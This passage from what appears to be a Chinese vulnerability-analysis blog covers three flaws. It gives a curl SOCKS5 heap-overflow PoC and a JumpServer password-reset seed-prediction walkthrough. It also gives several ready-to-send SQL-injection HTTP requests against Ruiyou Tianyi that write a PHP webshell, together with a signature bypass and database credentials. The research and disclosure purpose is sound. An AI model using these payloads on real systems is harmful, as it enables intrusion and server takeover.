CURLPX_SEND_CONNECT, ...... sxstate(sx, data, CONNECT_SOCKS_READ); goto CONNECT_SOCKS_READ_INIT; 在状态 CONNECT_SOCKS_READ_INIT中，会赋值结构体成员而后将状态转为 CONNECT_SOCKS_READ，curl会尝试从TCP连接中读取数据\ncase CONNECT_SOCKS_READ_INIT: sx-\u0026gt;outstanding = 2; /* expect two bytes */ sx-\u0026gt;outp = socksreq; /* store it here */ /* FALLTHROUGH */ case CONNECT_SOCKS_READ: presult = socks_state_recv(cf, sx, data, CURLPX_RECV_CONNECT, \u0026#34;initial SOCKS5 response\u0026#34;); if(CURLPX_OK != presult) return presult; else if(sx-\u0026gt;outstanding) { /* remain in reading state */ return CURLPX_OK; } 读取数据时，其调用栈如下\ngef➤ bt #0 cf_socket_recv (cf=0x5555555e6a28, data=0x5555555e6ef8, buf=0x5555555ddb48 \u0026#34;\\005\\001\u0026#34;, len=0x2, err=0x7fffffffb3a4) at cf-socket.c:1352 #1 0x00007ffff7ed5d95 in Curl_cf_def_recv (cf=0x5555555e63e8, data=0x5555555e6ef8, buf=0x5555555ddb48 \u0026#34;\\005\\001\u0026#34;, len=0x2, err=0x7fffffffb3a4) at cfilters.c:100 #2 0x00007ffff7ed6762 in Curl_conn_cf_recv (cf=0x5555555e63e8, data=0x5555555e6ef8, buf=0x5555555ddb48 \u0026#34;\\005\\001\u0026#34;, len=0x2, err=0x7fffffffb3a4) at cfilters.c:328 #3 0x00007ffff7f4839a in socks_state_recv (cf=0x5555555e6428, sx=0x5555555e6468, data=0x5555555e6ef8, failcode=CURLPX_RECV_CONNECT, description=0x7ffff7f82254 \u0026#34;initial SOCKS5 response\u0026#34;) at socks.c:241 #4 0x00007ffff7f49274 in do_SOCKS5 (cf=0x5555555e6428, sx=0x5555555e6468, data=0x5555555e6ef8) at socks.c:646 #5 0x00007ffff7f4a137 in connect_SOCKS (cf=0x5555555e6428, sxstate=0x5555555e6468, data=0x5555555e6ef8) at socks.c:1067 #6 0x00007ffff7f4a3f1 in socks_proxy_cf_connect (cf=0x5555555e6428, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at socks.c:1149 #7 0x00007ffff7ed6635 in Curl_conn_cf_connect (cf=0x5555555e6428, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at cfilters.c:296 #8 0x00007ffff7edaa4d in cf_setup_connect (cf=0x5555555e6348, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at connect.c:1201 #9 0x00007ffff7ed68a1 in Curl_conn_connect (data=0x5555555e6ef8, sockindex=0x0, blocking=0x0, done=0x7fffffffb667) at cfilters.c:351 #10 0x00007ffff7f276b7 in multi_runsingle (multi=0x5555555dd868, nowp=0x7fffffffb6f0, data=0x5555555e6ef8) at multi.c:2106 #11 0x00007ffff7f28d94 in curl_multi_perform (multi=0x5555555dd868, running_handles=0x7fffffffb754) at multi.c:2742 #12 0x00007ffff7eeb1e6 in easy_transfer (multi=0x5555555dd868) at easy.c:682 #13 0x00007ffff7eeb3d4 in easy_perform (data=0x5555555e6ef8, events=0x0) at easy.c:772 #14 0x00007ffff7eeb40c in curl_easy_perform (data=0x5555555e6ef8) at easy.c:791 #15 0x000055555557a1f3 in serial_transfers (global=0x7fffffffb900, share=0x5555555d9f08) at tool_operate.c:2479 #16 0x000055555557a7c1 in run_all_transfers (global=0x7fffffffb900, share=0x5555555d9f08, result=CURLE_OK) at tool_operate.c:2670 #17 0x000055555557ab6c in operate (global=0x7fffffffb900, argc=0x7, argv=0x7fffffffba98) at tool_operate.c:2786 #18 0x00005555555710f8 in main (argc=0x7, argv=0x7fffffffba98) at tool_main.c:274 让我们把代码放在一起看，在do_SOCKS5函数中，将 sx-\u0026gt;outstanding赋值为2，尝试调用 socks_state_recv从TCP sock中读取两个字节的数据，经过层层调用最终进入到 nw_in_read函数中，调用recv函数从sock中读取数据。\npresult = socks_state_recv(cf, sx, data, CURLPX_RECV_CONNECT, \u0026#34;initial SOCKS5 response\u0026#34;); if(CURLPX_OK != presult) return presult; else if(sx-\u0026gt;outstanding) { /* remain in reading state */ return CURLPX_OK; } static CURLproxycode socks_state_recv(struct Curl_cfilter *cf, ..... { ssize_t nread; CURLcode result; nread = Curl_conn_cf_recv(cf-\u0026gt;next, data, (char *)sx-\u0026gt;outp, sx-\u0026gt;outstanding, \u0026amp;result); ...... sx-\u0026gt;outstanding -= nread; return CURLPX_OK; } ssize_t Curl_conn_cf_recv(struct Curl_cfilter *cf, struct Curl_easy *data, { if(cf) return cf-\u0026gt;cft-\u0026gt;do_recv(cf, data, buf, len, err); *err = CURLE_RECV_ERROR; return -1; } static ssize_t cf_socket_recv(struct Curl_cfilter *cf, struct Curl_easy *data, char *buf, size_t len, CURLcode *err) { struct cf_socket_ctx *ctx = cf-\u0026gt;ctx; curl_socket_t fdsave; ssize_t nread; *err = CURLE_OK; fdsave = cf-\u0026gt;conn-\u0026gt;sock[cf-\u0026gt;sockindex]; cf-\u0026gt;conn-\u0026gt;sock[cf-\u0026gt;sockindex] = ctx-\u0026gt;sock; ...... else { nread = nw_in_read(\u0026amp;rctx, (unsigned char *)buf, len, err); ...... return nread; } static ssize_t nw_in_read(void *reader_ctx, unsigned char *buf, size_t len, CURLcode *err) { struct reader_ctx *rctx = reader_ctx; struct cf_socket_ctx *ctx = rctx-\u0026gt;cf-\u0026gt;ctx; ssize_t nread; *err = CURLE_OK; nread = sread(ctx-\u0026gt;sock, buf, len); ...... return nread; } #define sread(x,y,z) (ssize_t)recv((RECV_TYPE_ARG1)(x), \\ (RECV_TYPE_ARG2)(y), \\ (RECV_TYPE_ARG3)(z), \\ (RECV_TYPE_ARG4)(0)) 根据RFC1928，服务器会在客户端发送hello包之后返回，选择通信方法后返回server hello client hello server hello 正常情况下，socks服务器返回server hello之后，socks_state_recv读取了两个字节的数据并通过 sx-\u0026gt;outstanding -= nread;使得outstanding=0，之后在状态机内会继续处理socks连接。\n但如果攻击者可控socks服务器，并强迫在服务器在client 发送hello之后，过了client 设置的sock timeout在返回数据包的话会怎么样？ recv函数如果在setsockopt设置的超时时间内还没有从TCP连接读取到数据的话，则会返回-1，并且err被设置为CURLE_AGAIN ，在 socks_state_recv函数中因为读取到的nread=-1，所以这个函数返回CURLPX_OK。\n返回到状态机中，presult=CURLPX_OK，sx-\u0026gt;outstanding=2，do_SOCKS5函数返回CURLPX_OK，因为没读数据，所以在easy.c中会继续循环。\nstatic CURLcode easy_transfer(struct Curl_multi *multi) { bool done = FALSE; CURLMcode mcode = CURLM_OK; CURLcode result = CURLE_OK; while(!done \u0026amp;\u0026amp; !mcode) { int still_running = 0; mcode = curl_multi_poll(multi, NULL, 0, 1000, NULL); if(!mcode) mcode = curl_multi_perform(multi, \u0026amp;still_running); /* only read \u0026#39;still_running\u0026#39; if curl_multi_perform() return OK */ if(!mcode \u0026amp;\u0026amp; !still_running) { int rc; CURLMsg *msg = curl_multi_info_read(multi, \u0026amp;rc); if(msg) { result = msg-\u0026gt;data.result; done = TRUE; } } } /* Make sure to return some kind of error if there was a multi problem */ if(mcode) { result = (mcode == CURLM_OUT_OF_MEMORY) ? CURLE_OUT_OF_MEMORY : /* The other multi errors should never happen, so return something suitably generic */ CURLE_BAD_FUNCTION_ARGUMENT; } return result; } 此时socks服务器返回数据的话，再次进入到do_SOCKS5函数，此时在函数开头socks5_resolve_local=false，进入到状态机中，由于此时状态不再是CONNECT_SOCKS_INIT，所以socks5_resolve_local不会被设置为true，此时在状态CONNECT_REQ_INIT时，状态机会跳转到状态CONNECT_RESOLVE_REMOTE，也就是curl尝试让socks服务器进行DNS解析并请求。\nunsigned char *socksreq = (unsigned char *)data-\u0026gt;state.buffer; const size_t hostname_len = strlen(sx-\u0026gt;hostname); CONNECT_RESOLVE_REMOTE: case CONNECT_RESOLVE_REMOTE: /* Authentication is complete, now specify destination to the proxy */ len = 0; socksreq[len++] = 5; /* version (SOCKS5) */ socksreq[len++] = 1; /* connect */ socksreq[len++] = 0; /* must be zero */ if(!socks5_resolve_local) { ...... memcpy(\u0026amp;socksreq[len], sx-\u0026gt;hostname, hostname_len); /* w/o NULL */ ...... } /* FALLTHROUGH */ 此时curl会尝试将主机名通过memcpy拷贝到tcp 请求体中，而socksreq指向的内存由Curl_preconnect分配\nCURLcode Curl_preconnect(struct Curl_easy *data) { if(!data-\u0026gt;state.buffer) { data-\u0026gt;state.buffer = malloc(data-\u0026gt;set.buffer_size + 1); if(!data-\u0026gt;state.buffer) return CURLE_OUT_OF_MEMORY; } return CURLE_OK; } 在我的环境中可以看到最终的内存大小为0x8ce+1\ngef➤ p data.set.buffer_size $12 = 0x8ce gef➤ 所以如果构造大于这个大小的hostname，在memcpy时就可以触发堆溢出。\nPoC\ncurl --location --limit-rate 2254B --socks5-hostname 192.168.32.1:10808 $(python3 -c \u0026#34;print(\u0026#39;A\u0026#39;*10000,end=\u0026#39;\u0026#39;)\u0026#34;) 小结 在修复代码中，如果hostname超过255则会直接返回错误，而不再访问后面的状态机，直接阻断了调用链。虽然url的hostname没有长度规定，可以超过1024，但由于DNS解析最大只支持255字节的域名，所以在正常请求中不应该出现域名大于255的情况，从这个角度看此次修复方式也很合理。\n从利用角度看这个漏洞，攻击者需要可以控制curl或libcurl使用的socks5代理，还需要控制传递给curl和libcurl的url，而后才能触发漏洞，表面看攻击者可以控制溢出的范围和内容，很可能通过堆溢出造成代码执行。但curl会通过url parser去验证url有效性，如果url无效则会产生错误，因此只当url合法时才会触发漏洞，也就是攻击者构造的url只能是ASCII字符的子集，综合上面的条件，这个漏洞利用难度极大，造成代码执行的几率很小。\n考虑到大部分软件即使能控制url，但也不能控制让libcurl使用socks5代理，所以可以择期修复这个漏洞。\n题外话 这个漏洞还让curl的作者难过了一下：It burns in my soul. 作者说，如果使用内存安全的语言重写curl的话，那这些漏洞就不会存在，当然在可预见的未来curl还是会用c开发，但目前可行的办法是逐渐使用内存安全的依赖项替代。\n参考链接\nhttps://curl.se/docs/CVE-2023-38545.html\nhttps://daniel.haxx.se/blog/2023/10/11/how-i-made-a-heap-overflow-in-curl/\nhttps://hackerone.com/reports/2187833\nhttps://datatracker.ietf.org/doc/html/rfc1928\nCreated at 2023-10-11T20:40:32+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-42820-jumpserver-pwd-reset-vuln/","title":"CVE-2023-42820 Jumpserver 任意用户密码重置漏洞分析","tags":["漏洞分析"],"description":"","content":"基本信息 jumpserver中第三方库向用户公开了随机库所用的seed，并且没有限制重置密码接口的次数，导致攻击者可以获取到随机库的随机种子并尝试预测重置密码的验证码，进而重置任意用户密码。 利用该漏洞需要已知用户名和对应的邮箱。\n指纹 hunter\nweb.title=\u0026#34;jumpserver\u0026#34; 影响版本 CVE-2023-42820 v2.24 - v3.6.4 环境搭建 参考\rhttps://github.com/jumpserver/Dockerfile，将版本改为3.6.4，使用docker启动即可。\n技术分析\u0026amp;调试 补丁分析 漏洞在commit 0eba6d2175ab752399c5aee2dbaaf311bf0a398d修复，查看补丁，可知在apps/common/utils/random.py#random_string处增加了 random.seed()调用，同时对 apps/users/models/user.py#generate_reset_token生成token改为增加了 random.seed调用的random_string函数 到这里只能隐约猜到是一个密码学有关的漏洞，应该可以通过爆破利用。\n技术分析 在前两天有师傅写出了分析，才恍然大悟。\n根据\rjumpserver最新re-auth复现（伪随机经典案例）可知在本例的jumpserver中在如下地方生成重置密码时的验证码，其中使用了本次修复的函数 random_string生成6位，范围为000000-999999的数字验证码\nopt/jumpserver/apps/authentication/api/password.py def create(self, request, *args, **kwargs): token = request.GET.get(\u0026#39;token\u0026#39;) userinfo = cache.get(token) if not userinfo: return HttpResponseRedirect(reverse(\u0026#39;authentication:forgot-previewing\u0026#39;)) serializer = self.get_serializer(data=request.data) serializer.is_valid(raise_exception=True) username = userinfo.get(\u0026#39;username\u0026#39;) form_type = serializer.validated_data[\u0026#39;form_type\u0026#39;] code = random_string(6, lower=False, upper=False) with open(\u0026#34;/tmp/code\u0026#34;,\u0026#34;a\u0026#34;) as f: f.write(code+\u0026#34;\\n\u0026#34;) other_args = {} target = serializer.validated_data[form_type] if form_type == \u0026#39;sms\u0026#39;: query_key = \u0026#39;phone\u0026#39; target = target.lstrip(\u0026#39;+\u0026#39;) else: query_key = form_type user, err = self.is_valid_user(username=username, **{query_key: target}) if not user: return Response({\u0026#39;error\u0026#39;: err}, status=400) subject = \u0026#39;%s: %s\u0026#39; % (get_login_title(), _(\u0026#39;Forgot password\u0026#39;)) context = { \u0026#39;user\u0026#39;: user, \u0026#39;title\u0026#39;: subject, \u0026#39;code\u0026#39;: code, } message = render_to_string(\u0026#39;authentication/_msg_reset_password_code.html\u0026#39;, context) other_args[\u0026#39;subject\u0026#39;], other_args[\u0026#39;message\u0026#39;] = subject, message SendAndVerifyCodeUtil(target, code, backend=form_type, **other_args).gen_and_send_async() return Response({\u0026#39;data\u0026#39;: \u0026#39;ok\u0026#39;}, status=200) 在大学学习c语言的rand函数时，如果不对其显式使用srand函数播种的话，则每次运行程序随机出来的结果是一样的，因为rand使用的种子在计算机启动时就不会再变化了，所以我们要使用srand函数产生种子并进行播种，来使得rand函数的结果不一样。 实际上计算机中的随机数不是真正的随机数，而是伪随机数，计算机根据传入的种子经过某些运算得出结果。 对于一个进程，随机的种子确定则随机数也确定。 这个规律在python中也一样，对于同样的seed及同样的随机次数，一定会生成同样的数字。\nPython 3.11.4 (tags/v3.11.4:d2340ef, Jun 7 2023, 05:45:37) [MSC v.1934 64 bit (AMD64)] on win32 Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; import random \u0026gt;\u0026gt;\u0026gt; random.seed(1010) \u0026gt;\u0026gt;\u0026gt; random.random() 0.6710054770408643 ➜ chestnut python3 Python 3.11.4 (main, Jun 7 2023, 10:13:09) [GCC 12.2.0] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; import random \u0026gt;\u0026gt;\u0026gt; random.seed(1010) \u0026gt;\u0026gt;\u0026gt; random.random() 0.6710054770408643 \u0026gt;\u0026gt;\u0026gt; 虽然我们现在知道了这个漏洞应该源于伪随机数，但我们如果没办法获取到随机时所设置的种子，也没办法预测随即结果。\n下面就是这个漏洞的精华所在，根据文章所述。 django使用了第三方库djiango-simple-captcha库来生成验证码，在这个库生成的时候会有如下逻辑： 在usr/local/lib/python3.11/site-packages/captcha/views.py$captcha_image中，通过传入的key设置random.seed()，而传入的key则是浏览器向后端请求图片的路径，下图的key为 c83d66ac7dca7e2189ad17a9a3e532f2e87d5c07\ndef captcha_image(request, key, scale=1): if scale == 2 and not settings.CAPTCHA_2X_IMAGE: raise Http404 try: store = CaptchaStore.objects.get(hashkey=key) except CaptchaStore.DoesNotExist: # HTTP 410 Gone status so that crawlers don\u0026#39;t index these expired urls. return HttpResponse(status=410) random.seed(key) # Do not generate different images for the same key text = store.challenge 也就是我们可以通过图片的url间接知道jumpserver随机时所使用的种子，也就是说，通过图片地址我们可以获取到种子，如果生成验证码时所在的进程和这个生成图片验证码的进程在同一个进程，那么我们就可以通过获取到的种子和使用jumpserver生成验证码的算法来预测jumpserver生成重置密码的验证码。 这样我们可以在很少的时间（次数）内预测到重置密码的验证码，进而重置密码。 但仅仅这么简单吗？在jumpserver中使用了 gunicorn，它会使用master进程fork worker进程，处理用户请求，所以即使我们通过单次的图片请求获取到了random的种子，处理重置密码请求的进程可能不是被获取到种子的进程，这样预测出来的验证码和重置密码时生成的不会一样。\n➜ chestnut docker top 808b | grep python root 5704 5674 0 11:08 ? 00:00:02 python jms start web root 5864 5704 0 11:08 ? 00:00:01 /usr/local/bin/python /usr/local/bin/celery -A ops flower -logging=info --url_prefix=/core/flower --auto_refresh=False --max_tasks=1000 --state_save_interval=600000 root 5865 5704 0 11:08 ? 00:00:00 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss \u0026#34;%(r)s\u0026#34; %(s)s %(b)s --access-logfile - root 5867 5865 0 11:08 ? 00:00:01 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss \u0026#34;%(r)s\u0026#34; %(s)s %(b)s --access-logfile - root 5868 5865 0 11:08 ? 00:00:02 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss \u0026#34;%(r)s\u0026#34; %(s)s %(b)s --access-logfile - root 5873 5865 0 11:08 ? 00:00:02 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss \u0026#34;%(r)s\u0026#34; %(s)s %(b)s --access-logfile - root 5874 5865 0 11:08 ? 00:00:02 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss \u0026#34;%(r)s\u0026#34; %(s)s %(b)s --access-logfile - 在文章中提到可以有两种办法：\n并发同时发送多个请求，通过大量请求使得每个gunicorn进程都会接收到图片验证码的请求，从而将所有进程的seed设置为同一个种子，这样后续重置密码时无论哪个进程接收到的请求，该进程的seed都是已知的。 通过某种办法将gunicorn打挂，并监测服务状态，当服务响应码从502变为200时，说明进程恢复正常，这时通过少量请求即可将所有目标进程的seed设置为我们已知的值。 并发发送大量请求让我想起了k8s环境中，pod切换IP的场景， 时间比较紧（太笨了），没看出来哪里可以造成crash，在使用第一种办法的时候，发现会有些许问题\n在发送几千个请求之后，通过图片验证码请求触发重置密码时，后端会返回这个验证码不正确 在发送请求之后，经过测试使用seed生成和jumpserver相同的code需要经过几万次 所以在这里讨巧，手动重启core container（模拟crash了gunicorn的场景），而后通过请求验证码图片设置seed，经过测试成功的次数范围为200+，即成功生成和jumpserver一样的重置密码验证码需要random两百多次。\n小结 回过头看文章所说的 随机深度，按照我的理解就是在生成code时，所在进程已经random了几次，随机次数越多，预测时所要的次数也就越多，因为相同的seed经过相同的次数生成的随机数是一样的，在生成验证码和random_string函数中均有多次使用random类函数生成随机数，所以才需要循环计算进行碰撞。 在漏洞利用过程中，除了前面说的覆盖seed的问题，jumpserver还会验证请求url里面的token以及POST的body里面需要携带csrf token，这些都可以通过url解析以及xpath从请求响应中获取到。在一个就是生成重置密码验证码后，这个验证码有60秒有效期，过了60秒之后再去碰撞后端会返回验证码已过期，需要重新生成。 在有个问题就是图片验证码涉及到数学运算，粗略看来验证码应该可以通过ocr库进行识别并计算，实现自动化获取图片地址、设置seed、计算验证码等，这个只能等节后仔细研究了。\n参考链接\nhttps://github.com/jumpserver/jumpserver/security/advisories/GHSA-7prv-g565-82qp\nhttps://mp.weixin.qq.com/s/VShjaDI1McerX843YyOENw\n创建于2023-09-28\nCreated at 2023-09-29T20:32:52+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC-rce/","title":"瑞友天翼 Rce分析","tags":["漏洞分析"],"description":"","content":"基本信息 环境搭建 略\n影响版本 略\n技术分析 数据库基本信息\n127.0.0.1:5873 db: CASSystemDS pwd: F1B5214C user: admin 在ConsoleExternalApi.XGI中根据代码逻辑可得，请求中需携带initparams、key、sign等参数\n$initparams = $_REQUEST[\u0026#39;initParams\u0026#39;]; $key = $_REQUEST[\u0026#39;key\u0026#39;]; $sign = $_REQUEST[\u0026#39;sign\u0026#39;]; 参数校验逻辑如下，此时直接使用key=inner绕过判断，则$keyVal值为Realor，下面拼接了$initparams和$keyVal并计算其md5值是否和sign变量相同。\nif ($key == \u0026#34;wusuokey\u0026#34;) { $keyVal = $COMCASWEB-\u0026gt;getfarminfo($key); } else if ($key == \u0026#34;inner\u0026#34;) { $keyVal = \u0026#34;Realor\u0026#34;; } if (!isset($keyVal) || empty($keyVal)) { write_log(\u0026#34;{\u0026#39;参数非法\u0026#39;:\u0026#39;key值为空\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;参数非法\u0026#39;); } $signCalculate = md5($initparams . $keyVal); //testLog(\u0026#34;signCalculate=\u0026#34; . $signCalculate); if ($signCalculate != $sign) { write_log(\u0026#34;{\u0026#39;参数非法\u0026#39;:\u0026#39;参数加密方法错误\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;参数非法\u0026#39;); } 之后使用两个下划线分割$initparams变量，存入数组并遍历数组\n// 两个下划线分割，变成一个数组，之后遍历数组，用一个下划线分割并变成键值对存入$requestObj变量中。 $paramArr = explode(\u0026#34;__\u0026#34;, $initparams); if (count($paramArr) == 0) { write_log(\u0026#34;{\u0026#39;参数非法\u0026#39;:\u0026#39;参数中未包含__\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;参数非法11\u0026#39;); } $requestObj = null; //testLog($paramArr); foreach ($paramArr as $key =\u0026gt; $value) { $keyValue = explode(\u0026#34;_\u0026#34;, $value); $requestObj[$keyValue[0]] = $keyValue[1]; } 之后从键值对数组中取出键为command的值，进行判断 $cmd = $requestObj['command']; 当$cmd为createUser时，从请求中取出POST body并尝试进行json decode，从中取出键为account的值拼接到sql语句中进行查询，此时可以使用单引号进行sql注入，借助union select into outfile语句写入webshell，达成代码执行。\nif ($cmd == \u0026#34;createUser\u0026#34;) { $POST_JSON = json_decode($HTTP_RAW_POST_DATA, true); $fId = getDefaultVal($POST_JSON[\u0026#39;userGroupId\u0026#39;], getAdminGroupId()); $account = $POST_JSON[\u0026#39;account\u0026#39;]; if (!isset($account) || empty($account)) { write_log(\u0026#34;{\u0026#39;createUser\u0026#39;:\u0026#39;用户账户不可为空\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;用户账号不可为空\u0026#39;); } $account = utf8ToGbk($account); $userPwd = $POST_JSON[\u0026#39;userPwd\u0026#39;]; if (!isset($userPwd) || empty($userPwd)) { write_log(\u0026#34;{\u0026#39;createUser\u0026#39;:\u0026#39;用户密码不可为空\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;用户密码不可为空\u0026#39;); } //账号是否已存在 $result = mysql_query(\u0026#34;select * from cuser where name=\u0026#39;\u0026#34; . $account . \u0026#34;\u0026#39;\u0026#34;, $DSCon); PoC\nGET /index.php/Index/dologin?name=aa\u0026#39;);SELECT%20%22%3C?php%20phpinfo();?%3E%22%20into%20outfile%20%22../../WebRoot/1.php%22;\u0026#39; HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close 最新版poc\nPOST /ConsoleExternalApi.XGI?initParams=command_createUser\u0026amp;key=inner\u0026amp;sign=8b21270d796c45333f88f7db36ed9dbe HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 170 {\u0026#34;account\u0026#34;:\u0026#34;aaa\u0026#39; union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\\\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\\\u0026#34; into outfile \\\u0026#34;../../WebRoot/1.php\\\u0026#34;;#\u0026#34;,\u0026#34;userPwd\u0026#34;:\u0026#34;aa\u0026#34;} POST /ConsoleExternalApi.XGI?initParams=command_importUsers\u0026amp;key=inner\u0026amp;sign=ec7e8f5769c2455b773600c2912216fd HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 183 {\u0026#34;users\u0026#34;:[{\u0026#34;account\u0026#34;:\u0026#34;aaa\u0026#39; union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\\\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\\\u0026#34; into outfile \\\u0026#34;../../WebRoot/1.php\\\u0026#34;;#\u0026#34;,\u0026#34;userPwd\u0026#34;:\u0026#34;bbb\u0026#34;}]} POST /ConsoleExternalApi.XGI?initParams=command_editUser__userId_usr00000010\u0026amp;key=inner\u0026amp;sign=dd1d23cb85d99349f2ab003c73df331f HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 174 {\u0026#34;userGroupId\u0026#34;:\u0026#34;aa\u0026#34;,\u0026#34;account\u0026#34;:\u0026#34;aaa\u0026#39; union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\\\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\\\u0026#34; into outfile \\\u0026#34;../../WebRoot/1.php\\\u0026#34;;#\u0026#34;} POST /ConsoleExternalApi.XGI?initParams=command_allocatedPointsToServer\u0026amp;key=inner\u0026amp;sign=a3efd6862f5d11319c6de783b58ff04a HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 142 {\u0026#34;serverId\u0026#34;:\u0026#34;aa\u0026#39; union select 0,0,\\\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\\\u0026#34; into outfile \\\u0026#34;../../WebRoot/1.php\\\u0026#34;;#\u0026#34;,\u0026#34;pointNUm\u0026#34;:\u0026#34;aaa\u0026#34;,\u0026#34;maximumConcurrentNUm\u0026#34;:\u0026#34;aa\u0026#34;} POST /ConsoleExternalApi.XGI?initParams=command_getServerIpPort\u0026amp;key=inner\u0026amp;sign=94c4e967c00cb6da510b6a5e4e3c3fcc HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 89 {\u0026#34;iP\u0026#34;:\u0026#34;aa\u0026#39; union select 0,\\\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\\\u0026#34; into outfile \\\u0026#34;../../WebRoot/1.php\\\u0026#34;;#\u0026#34;} POST /ConsoleExternalApi.XGI?initParams=command_publishApp\u0026amp;key=inner\u0026amp;sign=74ed1f0c20a444c561294b4939b206dc HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 100 {\u0026#34;name\u0026#34;:\u0026#34;aa\u0026#39; union select \\\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\\\u0026#34; into outfile \\\u0026#34;../../WebRoot/1.php\\\u0026#34;;#\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;a\u0026#34;} POST /ConsoleExternalApi.XGI?initParams=command_editApp__appId_APP00000002\u0026amp;key=inner\u0026amp;sign=f25574d747ffbbd51496015d25438fa9 HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 223 {\u0026#34;name\u0026#34;:\u0026#34;aa\u0026#39; union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\\\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\\\u0026#34; into outfile \\\u0026#34;../../WebRoot/1.php\\\u0026#34;;#\u0026#34;} 代码逻辑：\n// 传入参数initParams key sign $initparams = $_REQUEST[\u0026#39;initParams\u0026#39;]; $key = $_REQUEST[\u0026#39;key\u0026#39;]; $sign = $_REQUEST[\u0026#39;sign\u0026#39;]; // 两个下划线分割$initparams，变成一个数组 $paramArr = explode(\u0026#34;__\u0026#34;, $initparams); // 设置key inner if ($key == \u0026#34;wusuokey\u0026#34;) { $keyVal = $COMCASWEB-\u0026gt;getfarminfo($key); } else if ($key == 